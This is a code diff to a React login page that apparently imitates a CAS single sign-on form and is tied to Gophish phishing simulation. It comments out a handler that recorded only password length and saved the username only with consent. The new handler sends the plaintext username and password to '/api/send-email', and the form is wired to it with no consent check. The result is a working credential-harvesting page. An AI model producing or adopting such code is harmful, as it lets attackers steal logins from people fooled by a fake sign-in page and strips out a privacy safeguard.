@@ -12,38 +12,79 @@ function App() {
   const [telemetryConsent, setTelemetryConsent] = useState(false);
   const [submitMessage, setSubmitMessage] = useState('');
 
-  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
-    e.preventDefault();
+  // const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
+  //   e.preventDefault();
 
-    const formData = new FormData(e.currentTarget);
-    const password = String(formData.get('password') ?? '');
-    const telemetry: LoginTelemetry = {
-      timestamp: new Date().toISOString(),
-      event: 'submit-button-click',
-      passwordLength: password.length,
-    };
+  //   const formData = new FormData(e.currentTarget);
+  //   const password = String(formData.get('password') ?? '');
+  //     const telemetry: LoginTelemetry = {
+  //       timestamp: new Date().toISOString(),
+  //       event: 'submit-button-click',
+  //       passwordLength: password.length,
+  //     };
 
-    if (telemetryConsent) {
-      telemetry.username = String(formData.get('username') ?? '');
-    }
+  //   if (telemetryConsent) {
+  //     telemetry.username = String(formData.get('username') ?? '');
+  //   }
 
-    const storedEvents = localStorage.getItem('gophish-login-telemetry');
-    let events: LoginTelemetry[] = [];
+  //   const storedEvents = localStorage.getItem('gophish-login-telemetry');
+  //   let events: LoginTelemetry[] = [];
 
-    if (storedEvents) {
-      try {
-        const parsedEvents: unknown = JSON.parse(storedEvents);
-        if (Array.isArray(parsedEvents)) {
-          events = parsedEvents as LoginTelemetry[];
-        }
-      } catch {
-        events = [];
-      }
-    }
+  //   if (storedEvents) {
+  //     try {
+  //       const parsedEvents: unknown = JSON.parse(storedEvents);
+  //       if (Array.isArray(parsedEvents)) {
+  //         events = parsedEvents as LoginTelemetry[];
+  //       }
+  //     } catch {
+  //       events = [];
+  //     }
+  //   }
 
-    localStorage.setItem('gophish-login-telemetry', JSON.stringify([...events, telemetry]));
-    // setSubmitMessage('Demo event recorded. The password itself was not stored.');
+  //   localStorage.setItem('gophish-login-telemetry', JSON.stringify([...events, telemetry]));
+  //   // setSubmitMessage('Demo event recorded. The password itself was not stored.');
+  // };
+
+  const handleSubmit = async (
+  event: React.FormEvent<HTMLFormElement>
+) => {
+  event.preventDefault();
+
+  const form = event.currentTarget;
+  const formData = new FormData(form);
+
+  const data = {
+    username: formData.get("username"),
+    password: formData.get("password"),
+    timestamp: new Date().toISOString(),
+    event: 'submit-button-click'
   };
+
+  try {
+    const response = await fetch("/api/send-email", {
+      method: "POST",
+
+      headers: {
+        "Content-Type": "application/json",
+      },
+
+      body: JSON.stringify(data),
+    });
+
+    if (!response.ok) {
+      throw new Error("Submission failed");
+    }
+
+    alert("Submitted successfully");
+
+    form.reset();
+
+  } catch (error) {
+    console.error(error);
+
+    alert("Something went wrong");
+  }
+};
 
   const handleKeyUp = (e: KeyboardEvent<HTMLInputElement>) => {
     if (typeof e.getModifierState === 'function') {
@@ -71,7 +112,7 @@ function App() {
       <section id="main">
         <div id="content" className="content">
           <div id="cas-content">
-            <form method="post" id="fm1" action="https://formsubmit.co">
+            <form method="post" id="fm1" onSubmit={handleSubmit}>
               <div className="row">
                 <div className="col-md-5 col-12 gx-0 gx-md-4">
                   <div id="login">
